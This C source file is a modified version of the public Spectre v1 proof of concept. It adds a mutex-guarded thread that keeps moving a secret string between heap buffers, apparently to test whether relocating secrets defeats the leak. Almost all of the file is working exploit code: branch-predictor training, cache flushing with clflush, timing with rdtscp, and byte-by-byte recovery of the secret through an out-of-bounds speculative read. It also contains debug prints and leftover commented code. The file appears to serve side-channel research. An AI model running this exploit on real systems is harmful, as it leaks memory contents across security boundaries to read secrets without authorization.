/*********************************************************************
* This is a modified version of spectre.c file in Spectre of PoC. The original version 
* could be access on https://github.com/crozone/SpectrePoC
* In this version, a moving function is added to move the secret data
* among memory blocks.
* To build and run:
* 1. Clone the spectre PoC repository from https://github.com/crozone/SpectrePoC
* 2. Copy this file to the same folder as the spectre.c file. 
* 3. Build:
*    $ gcc spectre.c -o spectre
*    $ gcc spectreMovewithMutex.c -lpthread -o spectreMovewithMutex
* 4. Run and see the differences
*    $ ./spectre
*    $ ./spectreMovewithMutex
*
*
* Spectre PoC
*
* This source code originates from the example code provided in the 
* "Spectre Attacks: Exploiting Speculative Execution" paper found at
* https://spectreattack.com/spectre.pdf
*
* Minor modifications have been made to fix compilation errors and
* improve documentation where possible.
*
**********************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <pthread.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtsc, rdtscp, clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
#endif

char * strkopi(char *dest, char *src, char *timpa);
char *kopi(char *dest, char *src);
void cetakan();
pthread_t tid[2];
pthread_mutex_t lock;
int argo;
const char * * argiv;

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

//char * secret;//
char test[] = "The Magic Words are Squeamish Ossifrage.";
char * secret = test;
char * gkey;// ="";
int x=0;
uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x) {
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}

/********************************************************************
Moving fungtion
********************************************************************/
char *kopi(char *dest, char *src)
{
   while(*dest++ = *src++);
   //gkey=dest;
        //strkopi(r[j],timpa,timpa);

   return dest;
}

void cetakan()
{
   printf("cetakan");
   //gkey=dest;
        //strkopi(r[j],timpa,timpa);

   //return dest;
}


char * strkopi(char *dest, char *src, char *timpa)
{

   while (*src) {
      *dest = *src;
      *src = *timpa;
      src++;
      dest++;
      timpa++;
   }
   *dest = '\0';
   return dest;
}

void * movement()//void *vargp)
{
    //volatile char r[7][33];//r[3][17];// = 0;
    //volatile char *s[7];
    printf("begin movement initialization");
    char **r = malloc(sizeof(char*)*11);
    int i, a=0;
    char random[] = "gggggggggggggggggggggggggggggggggggggggg";//"gggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg$
    for(i=0;i<11;i++){
        r[i] = malloc(41);//8192);//2048);//257);
        strkopi(r[i],random,random);//"gggggggggggggggggggggggggggggggg");
        //s[i]=r[i];
    }
    printf("awal movement loop");
    i=0;

    //int x=0;
    int j=0;
    //char keys[] = "01234f6789a0a1a2a3a4a5f6a7a8a9b1";//0123456789a0a1a2a3a4a5a6a7a8a9b10123456789a0a1a2a3a4a5a6a7a8a9b10123456789a0a1a2a3a4a5a6a7a8a9b10123456789a0a1a2a3a4a5a6a7a8a9b10123456789a0a1a2a3a4a5a6a7a8a9b10123456789a0a1a2a3a$
    char timpa[]= "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";//bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb$
    //s[2]="0123456789abcdef";
    //strkopi(r[10],secret,timpa);
    //strkopi(secret,timpa,timpa);
    //secret= r[10];
    //r[10]=secret;
    gkey=secret;
    //kopi(r[10], secret);
    strkopi(r[10],secret,timpa);
    secret=r[10];
    printf("di luar loop %s\n", r[10]);

    while(x==0){
	pthread_mutex_lock(&lock);
        //x=x+1;
        j=i+10;
        if(j>=15){
                j=j-15;
        }
        kopi(r[i],r[j]);

	if(i==10){
		kopi(gkey,r[i]);
		secret=gkey;
	}else{
        	secret=r[i];	
	}
	if(j==10){
		kopi(gkey,timpa);
	}
        kopi(r[j],timpa);
	a++;
        //sleep(10);
        //printf("nilai secret: %s\n", secret);//, gkey, r[i]);
        //printf("nilai gkey : %s \n", gkey);
        //printf("keys : %s\n", r[i]);
        //s[j]="0000000000000000";
        //strkopi(s[j],timpa);
        i=i+5;
        if(i==15){
                i=0;
        }
	pthread_mutex_unlock(&lock);
        nanosleep((const struct timespec[]){{0, 5000000L}}, NULL);
        //sleep(2);
	//x++;
    }
    j=i+10;
    if(j>=15){
           j=j-15;
    }
    kopi(r[j],timpa);
    printf("Moving number : %d\n", a);


}


/********************************************************************
Analysis code
********************************************************************/
#ifdef NOCLFLUSH
#define CACHE_FLUSH_ITERATIONS 2048
#define CACHE_FLUSH_STRIDE 4096
uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];

/* Flush memory using long SSE instructions */
void flush_memory_sse(uint8_t * addr)
{
  float * p = (float *)addr;
  float c = 0.f;
  __m128 i = _mm_setr_ps(c, c, c, c);

  int k, l;
  /* Non-sequential memory addressing by looping through k by l */
  for (k = 0; k < 4; k++)
    for (l = 0; l < 4; l++)
      _mm_stream_ps(&p[(l * 4 + k) * 4], i);
}
#endif

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;

#ifdef NOCLFLUSH
  int junk2 = 0;
  int l;
#endif

  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 999; tries > 0; tries--) {

#ifndef NOCLFLUSH
    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
#else
    /* Flush array2[256*(0..255)] from cache
       using long SSE instruction several times */
    for (j = 0; j < 16; j++)
      for (i = 0; i < 256; i++)
        flush_memory_sse( & array2[i * 512]);
#endif

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
#ifndef NOCLFLUSH
      _mm_clflush( & array1_size);
#else
      /* Alternative to using clflush to flush the CPU cache */
      /* Read addresses at 4096-byte intervals out of a large array.
         Do this around 2000 times, or more depending on CPU cache size. */

      for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
        junk2 = cache_flush_array[l];
      } 
#endif

      /* Delay (can also mfence) */
      volatile int z;
      for (z = 0; z < 100; z++) {}

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      victim_function(x);

    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = & array2[mix_i * 512];

    /*
    We need to accuratly measure the memory access to the current index of the
    array so we can determine which index was cached by the malicious mispredicted code.

    The best way to do this is to use the rdtscp instruction, which measures current
    processor ticks, and is also serialized.
    */

#ifndef NORDTSCP
      time1 = __rdtscp( & junk); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
#else

    /*
    The rdtscp instruction was instroduced with the x86-64 extensions.
    Many older 32-bit processors won't support this, so we need to use
    the equivalent but non-serialized tdtsc instruction instead.
    */

#ifndef NOMFENCE
      /*
      Since the rdstc instruction isn't serialized, newer processors will try to
      reorder it, ruining its value as a timing mechanism.
      To get around this, we use the mfence instruction to introduce a memory
      barrier and force serialization. mfence is used because it is portable across
      Intel and AMD.
      */

      _mm_mfence();
      time1 = __rdtsc(); /* READ TIMER */
      _mm_mfence();
      junk = * addr; /* MEMORY ACCESS TO TIME */
      _mm_mfence();
      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      _mm_mfence();
#else
      /*
      The mfence instruction was introduced with the SSE2 instruction set, so
      we have to ifdef it out on pre-SSE2 processors.
      Luckily, these older processors don't seem to reorder the rdtsc instruction,
      so not having mfence on older processors is less of an issue.
      */

      time1 = __rdtsc(); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
#endif
#endif
      if (time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

/*
*  Command line arguments:
*  1: Cache hit threshold (int)
*  2: Malicious address start (size_t)
*  3: Malicious address count (int)
*/


void *run() {
  
  int argc=argo;
  const char * * argv=&argiv;
  /* Default to a cache hit threshold of 80 */
  int cache_hit_threshold = 80;

  /* Default for malicious_x is the secret string address */
  size_t malicious_x = (size_t)(secret - (char * ) array1);
  
  //pthread_t tid;
  //pthread_create(&tid, NULL, movement, NULL);//
  //printf("magic:%s\n", secret);
  /* Default addresses to read is 40 (which is the length of the secret string) */
  int len = 40;
  
  int score[2];
  uint8_t value[2];
  int i;
  //char keys[] = "The Magic Words are Squeamish Ossifrage.";  
  //secret=keys;

  #ifdef NOCLFLUSH
  for (i = 0; i < sizeof(cache_flush_array); i++) {
    cache_flush_array[i] = 1;
  }
  #endif
  
  for (i = 0; i < sizeof(array2); i++) {
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  }

  /* Parse the cache_hit_threshold from the first command line argument.
     (OPTIONAL) */
  if (argc >= 2) {
    sscanf(argv[1], "%d", &cache_hit_threshold);
  }

  /* Parse the malicious x address and length from the second and third
     command line argument. (OPTIONAL) */
  if (argc >= 4) {
    sscanf(argv[2], "%p", (void * * )( &malicious_x));

    /* Convert input value into a pointer */
    malicious_x -= (size_t) array1;

    sscanf(argv[3], "%d", &len);
  }

  /* Print git commit hash */
  #ifdef GIT_COMMIT_HASH
    printf("Version: commit " GIT_COMMIT_HASH "\n");
  #endif
  
  /* Print cache hit threshold */
  printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);
  
  /* Print build configuration */
  printf("Build: ");
  #ifndef NORDTSCP
    printf("RDTSCP_SUPPORTED ");
  #else
    printf("RDTSCP_NOT_SUPPORTED ");
  #endif
  #ifndef NOMFENCE
    printf("MFENCE_SUPPORTED ");
  #else
    printf("MFENCE_NOT_SUPPORTED ");
  #endif
  #ifndef NOCLFLUSH
    printf("CLFLUSH_SUPPORTED ");
  #else
    printf("CLFLUSH_NOT_SUPPORTED ");
  #endif

  printf("\n");

  printf("Reading %d bytes:\n", len);
  int p=0;
  //pthread_create(&tid, NULL, movement, NULL);//
  /* Start the read loop to read each address */
  while (--len >= 0) {
    pthread_mutex_lock(&lock);
    printf("debug oi\n");
    printf("Reading at malicious_x = %p... ", (void * ) malicious_x);

    /* Call readMemoryByte with the required cache hit threshold and
       malicious x address. value and score are arrays that are
       populated with the results.
    */
    readMemoryByte(cache_hit_threshold, malicious_x++, value, score);

    /* Display the results */


    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X=’%c’ score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    
    if (score[1] > 0) {
      printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
      (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
    }
    /* if(len==0){
	len=40;
    }*/	
    p++;
    if(p==1000){
 	break;
    }
    printf("test %d\n",p);
    printf("isi secret : %s\n", secret);
    //movement();
    //cetakan();
    pthread_mutex_unlock(&lock);
    nanosleep((const struct timespec[]){{0, 5000000L}}, NULL);
    //sleep(1);
  }
  x=1;
  //pthread_exit(NULL);
  //return (0);
}

//int argo;
//const char * * argiv;

int main (int argc,
  const char * * argv){
  int val;
  argo=argc;
  argiv=&argv;
  //val=run(argc,argv);
  if (pthread_mutex_init(&lock, NULL) != 0)
    {
        printf("\n mutex init has failed\n");
        return 1;
    }
  pthread_create(&(tid[0]), NULL, run, NULL);
  pthread_create(&(tid[1]), NULL, movement, NULL);
  //pthread_create(&tid, NULL, myThreadFun1, NULL);//(void *)i);
  //pthread_mutex_t lock;
  pthread_join(tid[0], NULL);
  pthread_join(tid[1], NULL);
  pthread_mutex_destroy(&lock);
  pthread_exit(NULL);
  return 0;



}
